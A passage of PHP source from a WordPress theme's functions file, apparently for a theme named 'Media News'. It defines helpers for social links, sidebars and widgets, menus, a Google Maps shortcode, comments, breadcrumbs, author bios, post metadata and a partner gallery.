  			if ( isset($px_theme_option['social_net_url']) and count($px_theme_option['social_net_url']) > 0 ) {
				$i = 0;
				foreach ( $px_theme_option['social_net_url'] as $val ){
					if($val != ''){ ?>
                    	<a title="" href="<?php  echo $val; ?>" data-original-title="<?php  echo $px_theme_option['social_net_tooltip'][$i]; ?>" data-placement="top" <?php  echo $tooltip_data; ?> class="colrhover"  target="_blank">
						<?php  if($px_theme_option['social_net_awesome'][$i] <> '' && isset($px_theme_option['social_net_awesome'][$i])){ ?> 
                    <i class="fa <?php  echo $px_theme_option['social_net_awesome'][$i]; ?> <?php  echo $icon; ?>"></i><?php  } else { ?>
                    <img src="<?php  echo $px_theme_option['social_net_icon_path'][$i]; ?>" alt="<?php  echo $px_theme_option['social_net_tooltip'][$i]; ?>" /><?php  } ?></a>
					<?php 
					}
					$i++;
				}
			}
 			echo '</div>';
		}
	}

	// Post image attachment function
	
	if ( ! function_exists( 'px_attachment_image_src' ) ) {
	
		function px_attachment_image_src($attachment_id, $width, $height) {
			$image_url = wp_get_attachment_image_src($attachment_id, array($width, $height), true);
			
			if ($image_url[1] == $width and $image_url[2] == $height); else        
			$image_url = wp_get_attachment_image_src($attachment_id, "full", true);
			$parts = explode('/uploads/',$image_url[0]);
			
			if ( count($parts) > 1 ) return $image_url[0];
		}
	}

	if ( ! function_exists( 'px_get_post_img_src' ) ) {
		// Post image attachment source function
		function px_get_post_img_src($post_id, $width, $height) {
			
			if(has_post_thumbnail()){
				$image_id = get_post_thumbnail_id($post_id);
				$image_url = wp_get_attachment_image_src($image_id, array($width, $height), true);
				
				if ($image_url[1] == $width and $image_url[2] == $height) {
					return $image_url[0];
				} else {
					$image_url = wp_get_attachment_image_src($image_id, "full", true);
					return $image_url[0];
				}
	
			}
	
		}
	}
	if ( ! function_exists( 'px_get_post_img' ) ) {
		// Get Post image attachment
		function px_get_post_img($post_id, $width, $height) {
			$image_id = get_post_thumbnail_id($post_id);
			$image_url = wp_get_attachment_image_src($image_id, array($width, $height), true);
			if ($image_url[1] == $width and $image_url[2] == $height) {
				return get_the_post_thumbnail($post_id, array($width, $height));
			} else {
				return get_the_post_thumbnail($post_id, "full");
			}
		}
	}
	// custom sidebar start
	$px_theme_option = get_option('px_theme_option');
	
	if ( isset($px_theme_option['sidebar']) and !empty($px_theme_option['sidebar'])) {
		foreach ( $px_theme_option['sidebar'] as $sidebar ){
			register_sidebar(
				array(
					'name' => $sidebar,
					'id' => $sidebar,
					'description' => 'This widget will be displayed on right side of the page.',
					'before_widget' => '<div class="widget %2$s">',
					'after_widget' => '</div>',
					'before_title' => '<header class="pix-heading-title"><h2 class="pix-section-title heading-color">',
					'after_title' => '</h2></header>'
				)
			);
		}

	}
	register_sidebar( 
		array(
			'name' => 'Sidebar Widget',
			'id' => 'sidebar-1',
			'description' => 'This Widget Show the Content in Blog Listing page.',
			'before_widget' => '<div class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<header class="pix-heading-title"><h2 class="pix-section-title">',
			'after_title' => '</h2></header>'
		) 
	);
	
	//footer widget

	register_sidebar( array(
	
		'name' => 'Footer Widget',
	
		'id' => 'footer-widget',
	
		'description' => 'This Widget Show the Content in Footer Area.',
	
		'before_widget' => '<div class="widget %2$s">',
	
		'after_widget' => '</div>',
	
		'before_title' => '<header class="px-heading-title"><h2 class="px-section-title">',
	
		'after_title' => '</h2></header>'
	
	) );
	
	register_sidebar( array(
	
		'name' => 'Header Advertisement Widget',
	
		'id' => 'header-advertisement-widget',
	
		'description' => 'This Widget Show the Content in Header Area.',
	
		'before_widget' => '<div class="widget %2$s">',
	
		'after_widget' => '</div>',
	
		'before_title' => '<header class="px-heading-title"><h2 class="px-section-title">',
	
		'after_title' => '</h2></header>'
	
	) );
	register_sidebar( array(
	
		'name' => 'Footer Advertisement Widget',
	
		'id' => 'footer-advertisement-widget',
	
		'description' => 'This Widget Show the Content in Footer Area.',
	
		'before_widget' => '<div class="widget %2$s">',
	
		'after_widget' => '</div>',
	
		'before_title' => '<header class="px-heading-title"><h2 class="px-section-title">',
	
		'after_title' => '</h2></header>'
	
	) );

	
	if ( ! function_exists( 'px_add_menuid' ) ) {
		function px_add_menuid($ulid) {
			return preg_replace('/<ul>/', '<ul id="menus">', $ulid, 1);
		}
	}
	if ( ! function_exists( 'px_remove_div' ) ) {
		function px_remove_div ( $menu ){
			return preg_replace( array( '#^<div[^>]*>#', '#</div>$#' ), '', $menu );
		}
	}

	if ( ! function_exists( 'px_register_my_menus' ) ) {
		function px_register_my_menus() {
			register_nav_menus(array('main-menu'  => __('Main Menu','Media News'), 'top-menu'  => __('Top Menu','Media News') )  );
		}
	}

	if ( ! function_exists( 'px_add_parent_css' ) ) {
		function px_add_parent_css($classes, $item) {
			global $px_menu_children;
			
			if ($px_menu_children)$classes[] = 'parent';
			return $classes;
		}
	}
	
	// map shortcode with various options
		if ( ! function_exists( 'px_map_page' ) ) {
			function px_map_page(){
				global $px_node, $px_counter_node;
				if ( !isset($px_node->map_lat) or $px_node->map_lat == "" ) { $px_node->map_lat = 0; }
				if ( !isset($px_node->map_lon) or $px_node->map_lon == "" ) { $px_node->map_lon = 0; }
				if ( !isset($px_node->map_zoom) or $px_node->map_zoom == "" ) { $px_node->map_zoom = 11; }
				if ( !isset($px_node->map_info_width) or $px_node->map_info_width == "" ) { $px_node->map_info_width = 200; }
				if ( !isset($px_node->map_info_height) or $px_node->map_info_height == "" ) { $px_node->map_info_height = 100; }
				if ( !isset($px_node->map_show_marker) or $px_node->map_show_marker == "" ) { $px_node->map_show_marker = 'true'; }
				if ( !isset($px_node->map_controls) or $px_node->map_controls == "" ) { $px_node->map_controls = 'false'; }
				if ( !isset($px_node->map_scrollwheel) or $px_node->map_scrollwheel == "" ) { $px_node->map_scrollwheel = 'true'; }
				if ( !isset($px_node->map_draggable) or $px_node->map_draggable == "" )  { $px_node->map_draggable = 'true'; }
				if ( !isset($px_node->map_type) or $px_node->map_type == "" ) { $px_node->map_type = 'ROADMAP'; }
				if ( !isset($px_node->map_info)) { $px_node->map_info = ''; }
				if( !isset($px_node->map_marker_icon)){ $px_node->map_marker_icon = ''; }
				if( !isset($px_node->map_title)){ $px_node->map_title ='';}
				if( !isset($px_node->map_element_size) or $px_node->map_element_size == ""){ $px_node->map_element_size ='default';}
				if( !isset($px_node->map_height) || empty($px_node->map_height)){ $px_node->map_height ='360';}
			 
				$map_show_marker = '';
				if ( $px_node->map_show_marker == "true" ) { 
					$map_show_marker = " var marker = new google.maps.Marker({
								position: myLatlng,
								map: map,
								title: '',
								icon: '".$px_node->map_marker_icon."',
								shadow:''
							});
					";
				}
				$html = '<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=true"></script>';
				$html .= '<div class="element_size_'.$px_node->map_element_size.' px-map">';
					$html .= '<div class="contact-us rich_editor_text"><div class="map-sec">';
					
					$html .= '<div class="mapcode iframe mapsection gmapwrapp" id="map_canvas'.$px_counter_node.'" style="height:'.$px_node->map_height.'px;"> </div>';
				$html .= '</div>';
				
				if($px_node->map_title <> ''){$html .= '<h2 class="pix-post-title">'.$px_node->map_title.'</h2>'; }

                   $html .= '<p>'.$px_node->map_text.'</p>';
				   $html .= '</div>';
				$html .= '</div>';   
				//mapTypeId: google.maps.MapTypeId.".$px_node->map_type." ,
				if( $px_node->map_type == 'STYLED'){
					$px_node->map_type = 'ROADMAP';
					$html .= "<script type='text/javascript'>
							function initialize() {
								var styles = [
									{
									  stylers: [
										{ hue: '#000000' },
										{ saturation: -100 }
									  ]
									},{
									  featureType: 'road',
									  elementType: 'geometry',
									  stylers: [
										{ lightness: -40 },
										{ visibility: 'simplified' }
									  ]
									},{
									  featureType: 'road',
									  elementType: 'labels',
									  stylers: [
										{ visibility: 'on' }
									  ]
									}
								  ];
								var styledMap = new google.maps.StyledMapType(styles,
								{name: 'Styled Map'});
								var myLatlng = new google.maps.LatLng(".$px_node->map_lat.", ".$px_node->map_lon.");
								var mapOptions = {
									zoom: ".$px_node->map_zoom.",
									panControl: false,
									scrollwheel: ".$px_node->map_scrollwheel.",
									draggable: ".$px_node->map_draggable.",
									center: myLatlng,
									disableDefaultUI: true,
									disableDefaultUI: ".$px_node->map_controls.",
									mapTypeControlOptions: {
									  mapTypeIds: [google.maps.MapTypeId.ROADMAP.".$px_node->map_type.", 'map_style']
									}
								}
								var map = new google.maps.Map(document.getElementById('map_canvas".$px_counter_node."'), mapOptions);
								map.mapTypes.set('map_style', styledMap);
								map.setMapTypeId('map_style');
								var infowindow = new google.maps.InfoWindow({
									content: '".$px_node->map_info."',
									maxWidth: ".$px_node->map_info_width.",
									maxHeight:".$px_node->map_info_height.",
								});
								".$map_show_marker."
								//google.maps.event.addListener(marker, 'click', function() {
			
									if (infowindow.content != ''){
									  infowindow.open(map, marker);
									   map.panBy(1,-60);
									   google.maps.event.addListener(marker, 'click', function(event) {
										infowindow.open(map, marker);
			
									   });
									}
								//});
							}
						
						google.maps.event.addDomListener(window, 'load', initialize);
						</script>";
				}else{
					$html .= "<script type='text/javascript'>
							function initialize() {
								var myLatlng = new google.maps.LatLng(".$px_node->map_lat.", ".$px_node->map_lon.");
								var mapOptions = {
									zoom: ".$px_node->map_zoom.",
									panControl: false,
									scrollwheel: ".$px_node->map_scrollwheel.",
									draggable: ".$px_node->map_draggable.",
									center: myLatlng,
 									mapTypeId:google.maps.MapTypeId.ROADMAP.".$px_node->map_type.",
									disableDefaultUI: ".$px_node->map_controls.",
 									  
 								}
								var map = new google.maps.Map(document.getElementById('map_canvas".$px_counter_node."'), mapOptions);
 								var infowindow = new google.maps.InfoWindow({
									content: '".$px_node->map_info."',
									maxWidth: ".$px_node->map_info_width.",
									maxHeight:".$px_node->map_info_height.",
								});
								".$map_show_marker."
								//google.maps.event.addListener(marker, 'click', function() {
			
									if (infowindow.content != ''){
									  infowindow.open(map, marker);
									   map.panBy(1,-60);
									   google.maps.event.addListener(marker, 'click', function(event) {
										infowindow.open(map, marker);
			
									   });
									}
								//});
							}
						
						google.maps.event.addDomListener(window, 'load', initialize);
						</script>";
				}
				return $html;
			}
		}
	
	if (!function_exists('pixFill_comment')) :
	/**
     * Template for comments and pingbacks.
     *
     * To override this walker in a child theme without modifying the comments template
     * simply create your own pixFill_comment(), and that function will be used instead.
     *
     * Used as a callback by wp_list_comments() for displaying the comments.
     *
     */
	function pixFill_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		$args['reply_text'] = '<i class="fa fa-share"></i> Reply';
		switch ( $comment->comment_type ) :
		case '' :
			?>
        <li  <?php  comment_class(); ?> id="li-comment-<?php  comment_ID(); ?>">
            <div class="thumblist" id="comment-<?php  comment_ID(); ?>">
                <ul>
                    <li>
                        <figure>
                            <a href="#"><?php  echo get_avatar( $comment, 65 ); ?></a>
                        </figure>
                         <div class="text">
                          <header>
                                <?php  printf( __( '%s', 'Media News' ), sprintf( '<h5><a class="colrhover">%s</a></h5>', get_comment_author_link() ) ); 						/* translators: 1: date, 2: time */								printf( __( '<span>%1$s</span><br/>', 'Media News' ), get_comment_date());
	 							?>
                          </header>
                          <div class="bottom-comment">
							  <?php  comment_text(); ?>
                              <?php  edit_comment_link( __( '(Edit)', 'GreenPeace' ), ' ' ); ?>
                                    <?php  comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); 
									if ( $comment->comment_approved == '0' ) : ?>
                                    <div class="comment-awaiting-moderation colr">
                                        <?php  _e( 'Your comment is awaiting moderation.', 'GreenPeace' ); ?>
                                    </div>
                            <?php  endif; ?>
                           </div>
                        </div>
                    </li>
                </ul>
            </div>
         </li>
	<?php
    	break;
			case 'pingback'  :
			case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php  comment_author_link(); ?><?php  edit_comment_link( __( '(Edit)', 'Media News' ), ' ' ); ?></p>
		<?php
		break;
		endswitch;
		}
		endif;
			// password protect post/page
			
			if ( ! function_exists( 'px_password_form' ) ) {
				function px_password_form() {
					global $post,$px_theme_option;
					$label = 'pwbox-'.( empty( $post->ID ) ? rand() :
					$post->ID );
					$o = '<div class="password_protected single-password pix-content-wrap">
									<h5>' . __( "This post is password protected. To view it please enter your password below:",'Media News' ) . '</h5>';
									$o .= '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
												<label><input name="post_password" id="' . $label . '" type="password" size="20" /></label>
												<input class="backcolr" type="submit" name="Submit" value="'.__("Submit", "Media News").'" />
											</form></div>';
					return $o;
			}

		}

		// breadcrumb function
		
		if ( ! function_exists( 'px_breadcrumbs' ) ) {
			
			function px_breadcrumbs() {
				global $wp_query;
				/* === OPTIONS === */
				$text['home']     = 'Home';
				// text for the 'Home' link
				$text['category'] = '%s';
				// text for a category page
				$text['search']   = '%s';
				// text for a search results page
				$text['tag']      = '%s';
				// text for a tag page
				$text['author']   = '%s';
				// text for an author page
				$text['404']      = 'Error 404';
				// text for the 404 page
				$showCurrent = 1;
				// 1 - show current post/page title in breadcrumbs, 0 - don't show
				$showOnHome  = 1;
				// 1 - show breadcrumbs on the homepage, 0 - don't show
				$delimiter   = '';
				// delimiter between crumbs
				$before      = '<li class="pix-active">';
				// tag before the current crumb
				$after       = '</li>';
				// tag after the current crumb
				/* === END OF OPTIONS === */
				global $post,$px_theme_option;
				$current_page = __("Current Page",'Media News');;
				if(isset($px_theme_option["trans_switcher"]) && $px_theme_option["trans_switcher"] == "on") {  $current_page = __("Current Page",'Media News'); }else if(isset($px_theme_option["trans_currentpage"])){  $current_page = $px_theme_option["trans_currentpage"];}
				$homeLink = home_url() . '/';
				$linkBefore = '<li>';
				$linkAfter = '</li>';
				$linkAttr = '';
				$link = $linkBefore . '<a' . $linkAttr . ' href="%1$s">%2$s</a>' . $linkAfter;
				$linkhome = $linkBefore . '<a' . $linkAttr . ' href="%1$s">%2$s</a>' . $linkAfter;
				
				if (is_home() || is_front_page()) {
					
					if ($showOnHome == "1") echo '<div class="breadcrumbs"><ul>'.$before.'<a href="' . $homeLink . '">' . $text['home'] . '</a>'.$after.'</ul></div>';
				} else {
					echo '<div class="breadcrumbs"><ul>' . sprintf($linkhome, $homeLink, $text['home']) . $delimiter;
					
					if ( is_category() ) {
						$thisCat = get_category(get_query_var('cat'), false);
						
						if ($thisCat->parent != 0) {
							$cats = get_category_parents($thisCat->parent, TRUE, $delimiter);
							$cats = str_replace('<a', $linkBefore . '<a' . $linkAttr, $cats);
							$cats = str_replace('</a>', '</a>' . $linkAfter, $cats);
							echo $cats;
						}

						echo $before . sprintf($text['category'], single_cat_title('', false)) . $after;
					}

					elseif ( is_search() ) {
						echo $before . sprintf($text['search'], get_search_query()) . $after;
					}

					elseif ( is_day() ) {
						echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;
						echo sprintf($link, get_month_link(get_the_time('Y'),get_the_time('m')), get_the_time('F')) . $delimiter;
						echo $before . get_the_time('d') . $after;
					}

					elseif ( is_month() ) {
						echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;
						echo $before . get_the_time('F') . $after;
					}

					elseif ( is_year() ) {
						echo $before . get_the_time('Y') . $after;
					}

					elseif ( is_single() && !is_attachment() ) {
						
						if ( get_post_type() != 'post' ) {
							$post_type = get_post_type_object(get_post_type());
							$slug = $post_type->rewrite;
							printf($link, $homeLink . '/' . $slug['slug'] . '/', $post_type->labels->singular_name);
							
							if ($showCurrent == 1) echo $delimiter . $before . 'Current Page' . $after;
						} else {
							$cat = get_the_category();
							$cat = $cat[0];
							$cats = get_category_parents($cat, TRUE, $delimiter);
							
							if ($showCurrent == 0) $cats = preg_replace("#^(.+)$delimiter$#", "$1", $cats);
							$cats = str_replace('<a', $linkBefore . '<a' . $linkAttr, $cats);
							$cats = str_replace('</a>', '</a>' . $linkAfter, $cats);
							echo $cats;
							
							if ($showCurrent == 1) echo $before .'Current Page' . $after;
						}

					}

					elseif ( !is_single() && !is_page() && get_post_type() <> '' && get_post_type() != 'post' && !is_404() ) {
						$post_type = get_post_type_object(get_post_type());
						echo $before . $post_type->labels->singular_name . $after;
					}

					elseif (isset($wp_query->query_vars['taxonomy']) && !empty($wp_query->query_vars['taxonomy'])){
						$taxonomy = $taxonomy_category = '';
						$taxonomy = $wp_query->query_vars['taxonomy'];
						echo $before . $wp_query->query_vars[$taxonomy] . $after;
					}

					elseif ( is_page() && !$post->post_parent ) {
						
						if ($showCurrent == 1) echo $before . get_the_title() . $after;
					}

					elseif ( is_page() && $post->post_parent ) {
						$parent_id  = $post->post_parent;
						$breadcrumbs = array();
						while ($parent_id) {
							$page = get_page($parent_id);
							$breadcrumbs[] = sprintf($link, get_permalink($page->ID), get_the_title($page->ID));
							$parent_id  = $page->post_parent;
						}

						$breadcrumbs = array_reverse($breadcrumbs);
						for ($i = 0; $i < count($breadcrumbs); $i++) {
							echo $breadcrumbs[$i];
							
							if ($i != count($breadcrumbs)-1) echo $delimiter;
						}

						
						if ($showCurrent == 1) echo $delimiter . $before . get_the_title() . $after;
					}

					elseif ( is_tag() ) {
						echo $before . sprintf($text['tag'], single_tag_title('', false)) . $after;
					}

					elseif ( is_author() ) {
						global $author;
						$userdata = get_userdata($author);
						echo $before . sprintf($text['author'], $userdata->display_name) . $after;
					}

					elseif ( is_404() ) {
						echo $before . $text['404'] . $after;
					}

					//echo "<pre>"; print_r($wp_query->query_vars); echo "</pre>";
					
					if ( get_query_var('paged') ) {
						// if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
						// echo __('Page') . ' ' . get_query_var('paged');
						// if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
					}

					echo '</ul></div>';
				}

			}

		}
 		
		if ( ! function_exists( 'px_logo' ) ) {
			function px_logo($logo_url, $log_width, $logo_height){
			?>
				<a href="<?php  echo home_url(); ?>">
                	<img src="<?php  echo $logo_url; ?>"  style="width:<?php  echo $log_width; ?>px; height:<?php  echo $logo_height; ?>px" 
                    alt="<?php  echo bloginfo('name'); ?>" />
                </a>
	 		<?php
			}

		}
		/*Top and Main Navigation*/
		if ( ! function_exists( 'px_navigation' ) ) {
		
			function px_navigation($nav='', $menus = 'menus'){
				global $px_theme_option;
				// Menu parameters	
				if ( has_nav_menu( $nav ) ) {
					if (class_exists('px_mega_menu_walker')) {
					$defaults = array('theme_location' => "$nav", 'menu' => '','container' => '', 'container_class' => '','container_id' => '','menu_class' => '','menu_id' => "$menus",'echo' => false,'fallback_cb' => 'wp_page_menu','before' => '','after' => '','link_before' => '','link_after' => '','items_wrap' => '<ul id="%1$s">%3$s</ul>','depth' => 0,'walker' => new px_mega_menu_walker());
					} else {
						$defaults = array('menu_id' => "$menus",'container' => '', 'container_class' => '','container_id' => '','menu_class' => '',);
					}
					echo do_shortcode(wp_nav_menu($defaults));
					
				} else {
					$defaults = array('menu_id' => "$menus",'container' => '', 'container_class' => '','container_id' => '','menu_class' => '',);
					echo wp_nav_menu($defaults);
				}
				
			}



		}
	  // Column shortcode with 2/3/4 column option even you can use shortcode in column shortcode
	  
	  if ( ! function_exists( 'px_column_page' ) ) {
		  function px_column_page(){
			  global $px_node;
			  $html = '<div class="element_size_'.$px_node->column_element_size.' column">';
			  $html .= do_shortcode($px_node->column_text);
			  $html .= '</div>';
			  echo $html;
		  }

	  }

 if ( ! function_exists( 'px_meta_page' ) ) {	
	  // Get post meta in xml form
	  function px_meta_page($meta) {
		  global $px_meta_page;
		  $meta = get_post_meta(get_the_ID(), $meta, true);
		  if ($meta <> '') {
			  $px_meta_page = new SimpleXMLElement($meta);
			  return $px_meta_page;
		  }
		  
	  }
 }
  if ( !function_exists( 'px_meta_shop_page' ) ) {	
  // woocommerce shop meta
	  function px_meta_shop_page($meta, $id) {
		  global $px_meta_page;
		  $meta = get_post_meta($id, $meta, true);
			  if ($meta <> '') {
				  $px_meta_page = new SimpleXMLElement($meta);
				  return $px_meta_page;
			  }
	 }
  }

 if ( !function_exists( 'px_author_description' ) ) {	
	function px_author_description(){
		if (get_the_author_meta('description')){ ?>
			<!-- About Author -->
			<div class="pix-content-wrap">
                <header class="pix-heading-title">
                  <h2 class=" pix-section-title"><?php _e('About','Pixfill');?> <?php _e('Author','Pixfill');?></h2>
                </header>
				<div class="about-author">
					<!-- Thumbnail List Start -->
					<!-- Thumbnail List Item Start -->
					 <figure><a href="<?php echo get_author_posts_url(get_the_author_meta('ID')); ?>" class="float-left"><?php echo get_avatar(get_the_author_meta('user_email'), apply_filters('PixFill_author_bio_avatar_size', 106)); ?></a></figure>
					 <div class="text">
						<h4><a class="colrhover" href="<?php echo get_author_posts_url(get_the_author_meta('ID')); ?>"><?php echo get_the_author(); ?></a></h4>
						<span></span>
						<p><?php the_author_meta('description'); ?></p>
						<div class="followus">
							<?php if(get_the_author_meta('flicker') <> ''){?><a href="<?php the_author_meta('flicker'); ?>"><i class="fa fa-flickr"></i></a><?php }?>
							<?php if(get_the_author_meta('twitter') <> ''){?><a href="<?php the_author_meta('twitter'); ?>"><i class="fa fa-twitter-square"></i></a><?php }?>
							<?php if(get_the_author_meta('facebook') <> ''){?><a href="<?php the_author_meta('facebook'); ?>"><i class="fa fa-facebook-square"></i></a><?php }?>
							<?php if(get_the_author_meta('googleplus') <> ''){?><a href="<?php the_author_meta('googleplus'); ?>"><i class="fa fa-google-plus-square"></i></a><?php }?>
							<?php if(get_the_author_meta('linkedin') <> ''){?><a href="<?php the_author_meta('linkedin'); ?>"><i class="fa fa-linkedin-square"></i></a><?php }?>
						</div>
					</div>
				</div>
			</div>    
		   <!-- About Author End -->
		<?php	 
		} 
	}
 }

//
 if ( ! function_exists( 'px_next_prev_custom_links' ) ) {	
 	function px_next_prev_custom_links($post_type = 'post'){
	 	global $post;
		$previd = $nextid = '';
		$post_categoryy = '';	
		if($post_type == 'post'){
			$post_categoryy = 'category';	
		} else {
			$post_categoryy = 'category';	
		}
		
		$count_posts = wp_count_posts( "$post_type" )->publish;
		$px_postlist_args = array(
		   'posts_per_page'  => -1,
		   'order'           => 'ASC',
		   'post_type'       => "$post_type",
		); 
		$px_postlist = get_posts( $px_postlist_args );

		$ids = array();
		foreach ($px_postlist as $px_thepost) {
		   $ids[] = $px_thepost->ID;
		}
		$thisindex = array_search($post->ID, $ids);
		if(isset($ids[$thisindex-1])){
			$previd = $ids[$thisindex-1];
		} 
		if(isset($ids[$thisindex+1])){
			$nextid = $ids[$thisindex+1];
		} 
		?>
        <div class="single-paginate">
			<?php 
            if (isset($previd) &&  !empty($previd) && $previd >=0 ) {
               ?>
               <div class="next-post-paginate">
                <a href="<?php echo get_permalink($previd); ?>" class="pix-colr"><i class="fa fa-arrow-left"></i></a>
               </div>
                <?php
            }
            
            if (isset($nextid) &&   !empty($nextid) ) {
                ?>
                <div class="next-post-paginate">
                <a href="<?php echo get_permalink($nextid); ?>" class="pix-colr"><i class="fa fa-arrow-right"></i></a>
                 
                </div>
                <?php	
            }
            ?>
        </div>
        <?php
	 wp_reset_query();
 }
 }
  if ( ! function_exists( 'px_title_lenght' ) ) {	
	// posts/pages title lenght limit
	function px_title_lenght($str ='',$start =0,$length =30){
		return substr($str,$start,$length);
	}
  }
  if ( ! function_exists( 'px_defautlt_artilce' ) ) {	
// Default pages listing article
		function px_defautlt_artilce(){
			global $post,$px_theme_option;
			$img_class = '';
			if(!isset($px_theme_option['trans_read_more'])){
				$readmore = __('READ MORE','Media News');
			} else {
				if(isset($px_theme_option["trans_switcher"]) && $px_theme_option["trans_switcher"] == "on") { $readmore = __('READ MORE','Media News'); }elseif(isset($px_theme_option["trans_read_more"])){  $readmore = $px_theme_option["trans_read_more"];}
			}
			if(!isset($px_theme_option['default_excerpt_length'])){
				$default_excerpt_length = '255';
			} else {
				if(isset($px_theme_option['default_excerpt_length']) && $px_theme_option['default_excerpt_length'] <> ''){ $default_excerpt_length = $px_theme_option['default_excerpt_length']; }else{ $default_excerpt_length = '255';}
			}
			$image_url = px_attachment_image_src(get_post_thumbnail_id($post->ID), 325, 244);
			if($image_url == ""){
				$img_class = 'no-image';
			}
			?>
				 <article id="post-<?php the_ID(); ?>" <?php post_class($img_class); ?> >
				  <?php if($image_url <> ""){?>
						<figure><a href="<?php the_permalink(); ?>"><img src="<?php echo $image_url;?>" alt=""></a></figure>
					<?php }?>
					<div class="text">
						  <h2 class="pix-post-title"><a href="<?php the_permalink(); ?>" ><?php the_title(); ?>.</a></h2>
						  <?php px_posted_on(true,false,true,true,true,false);?>
						  <?php 
							px_get_the_excerpt($default_excerpt_length,false,' ...');
							wp_link_pages( array( 'before' => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'Media News' ) . '</span>', 'after' => '</div>', 'link_before' => '<span>', 'link_after' => '</span>' ) );
						   ?>
							<div class="blog-bottom">
							  <a href="<?php the_permalink(); ?>" class="btnreadmore btn pix-bgcolrhvr"><?php echo $readmore;?></a>
							</div>
						</div>
				</article>
		
			<?php
			
	}
  }
// header search function
if ( ! function_exists( 'px_search' ) ) {	
	function px_search(){
		?>
		<form id="searchform" method="get" action="<?php echo home_url()?>"  role="search">
			
			<input name="s" id="searchinput" value="<?php _e('Search for:', 'Media News'); ?>" type="text" />
			<button> <i class="fa fa-search"></i></button>
		</form>
	<?php
	
	}
}
// post date/categories/tags
if ( ! function_exists( 'px_posted_on' ) ) {
	function px_posted_on($cat=true,$tag=true,$comment=true,$date=true,$author=true,$icon=true,$rating=false, $single = ''){
		global $px_theme_option;
		$posted_on = '';
		if(isset($px_theme_option['trans_switcher']) && $px_theme_option['trans_switcher'] == "on"){ $posted_on =__('Posted on','Media News');}else{ if(isset($px_theme_option['trans_posted_on'])) $posted_on = $px_theme_option['trans_posted_on']; }
		?>
 		<ul class="post-options">
        	
        	<?php 
			if($rating == true){
				$rating = px_user_rating_horziantal_display();
				if(isset($rating) && $rating <> ''){
					echo '<li>'.px_user_rating_horziantal_display().'</li>';
				}
			}
			if(isset($single) && $single == 'single'){
				?>
                	<li><i class="fa fa-user"></i><?php echo $posted_on;?>: <a href="<?php echo get_author_posts_url(get_the_author_meta('ID')); ?>"><?php echo get_the_author(); ?></a></li>
                <?php
			}
			
			if($date==true){?>
                 <li>
                 	<?php if($icon==true){ echo '<i class="fa fa-clock-o"></i>'; } ?>
                    <time datetime="<?php echo date_i18n('Y-m-d',strtotime(get_the_date()));?>"><?php
						the_date( get_option('date_format'), '', '', true); 
					 	//echo date_i18n(get_option('date_format'),strtotime(get_the_date()));
					 ?>
                    </time>
                </li>
				<?php
				}
				/* translators: used between list items, there is a space after the comma */
				$trans_in = "";
				if($cat==true){
					if(isset($px_theme_option['trans_switcher']) && $px_theme_option['trans_switcher'] == "on"){ $trans_in =__('in','Media News');}else{ if(isset($px_theme_option['trans_listed_in'])) $trans_in = $px_theme_option['trans_listed_in']; }
					  $before_cat = '<li><span class="fa fa-folder-open">'.'</span> ';
					$categories_list = get_the_term_list ( get_the_id(), 'category', $before_cat, ', ', '</li>' );
					if ( $categories_list ){
						printf( __( '%1$s', 'Media News'),$categories_list );
					}
				}
				/* translators: used between list items, there is a space after the comma */
				if($tag == true){
					$before_tag = "<li>".__( 'tags ','Media News')."";
					$tags_list = get_the_term_list ( get_the_id(), 'post_tag', $before_tag, ', ', '</li>' );
					if ( $tags_list ){
						printf( __( '%1$s', 'Media News'),$tags_list );
					} // End if categories 
				}
				
				if(isset($single) && $single == 'single'){
					if($comment == true){
						 if ( comments_open() ) {  echo "<li  class='px-comments'>"; comments_popup_link( __( '0 Comment', 'Media News' ) , __( '1 Comment', 'Media News' ), __( '% Comments', 'Media News' ) ); }
					}
					px_featured();
				} else {
				
					if($comment == true){
						if ( comments_open() ) {  
							echo "<li class='px-comments'>"; comments_popup_link( __( '0 Comment', 'Media News' ) , __( ' 1 Comment', 'Media News' ), __( '% Comments', 'Media News' ) ); 
						}
					}
				}
				
				
				edit_post_link( __( 'Edit', 'Media News'), '<li>', '</li>' ); 
			?>
		</ul>
	<?php
	}
}
// footer show partner
if ( ! function_exists( 'px_show_partner' ) ) {	
	function px_show_partner(){
		global $px_theme_option;
		$gal_album_db = '0';
		if(isset($px_theme_option['partners_gallery']))
			$gal_album_db =$px_theme_option['partners_gallery'];
		?>
        <?php if($gal_album_db <> "0" and $gal_album_db <> ''){?>
        <div class="our-sponcers">
        	<?php  
				if($px_theme_option['partners_title'] <> ''){ ?>
            		<header class="sponcer-title">
                        <h3><?php  echo $px_theme_option['partners_title']; ?></h3>
                    </header>
            <?php  } 
				if($gal_album_db <> "0" and $gal_album_db <> ''){
			?>
        	<div class="container">
            
            <div class="center">
                <span class="cycle-prev" id="cycle-nexto"><i class="fa fa-angle-left"></i></span>
                <span class="cycle-next" id="cycle-prevt"><i class="fa fa-angle-right"></i></span>
            </div>
           	<div class="cycle-slideshow"
                    data-cycle-fx=carousel
                    data-cycle-next="#cycle-nexto"
                    data-cycle-prev="#cycle-prevt"
                    data-cycle-slides=">article"
                    data-cycle-timeout=0>
            	
                <?php
                    // galery slug to id start
                    $args=array(
                    'name' => (string)$gal_album_db,
                    'post_type' => 'px_gallery',
                    'post_status' => 'publish',
                    'showposts' => 2,
                    );
                    $get_posts = get_posts($args);
                    if($get_posts){
                    $gal_album_db = (int)$get_posts[0]->ID;
                    }
                    // galery slug to id end	
                    $px_meta_gallery_options = get_post_meta($gal_album_db, "px_meta_gallery_options", true);
                    // pagination start
                    if ( $px_meta_gallery_options <> "" ) {
						px_enqueue_cycle_script();
                    $xmlObject = new SimpleXMLElement($px_meta_gallery_options);
                    $limit_start = 0;
                    $limit_end = count($xmlObject);
                        for ( $i = $limit_start; $i < $limit_end; $i++ ) {
